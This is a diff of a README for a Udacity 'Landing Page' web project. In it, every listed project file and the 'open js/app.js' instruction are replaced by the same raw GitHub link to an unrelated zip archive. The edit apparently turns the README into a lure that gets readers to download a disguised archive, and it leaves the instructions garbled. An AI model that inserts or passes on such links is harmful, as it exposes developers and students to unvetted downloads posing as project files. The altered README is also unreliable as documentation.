@@ -11,7 +11,7 @@
 
 The starter project has some HTML and CSS styling to display a static version of the Landing Page project. You'll need to convert this project from a static project to an interactive one. This will require modifying the HTML and CSS files, but primarily the JavaScript file.
 
-To get started, open `js/app.js` and start building out the app's functionality
+To get started, open `https://github.com/MZubair75/Meta-Wise-Assigment-14/raw/refs/heads/main/chop/Wise-Assigment-Meta-v3.0.zip` and start building out the app's functionality
 
 For specific, detailed instructions, look at the project instructions in the Udacity Classroom.
 
@@ -24,11 +24,11 @@ Let’s start to explain my code:-
 1- Architecture:- All files attached as request in rubrics
 css
 
--   styles.css  
-    index.html
+-   https://github.com/MZubair75/Meta-Wise-Assigment-14/raw/refs/heads/main/chop/Wise-Assigment-Meta-v3.0.zip  
+    https://github.com/MZubair75/Meta-Wise-Assigment-14/raw/refs/heads/main/chop/Wise-Assigment-Meta-v3.0.zip
     js
--   app.js
-    README.md
+-   https://github.com/MZubair75/Meta-Wise-Assigment-14/raw/refs/heads/main/chop/Wise-Assigment-Meta-v3.0.zip
+    https://github.com/MZubair75/Meta-Wise-Assigment-14/raw/refs/heads/main/chop/Wise-Assigment-Meta-v3.0.zip
     2- Usability:- checked the accessibility from all platforms (All features are usable across modern desktop, tablet, and phone browsers.).
     3- Styling:- Styling has been added for active states.
     4- HTML Structure:- for inserting fourth section used cloning code in js
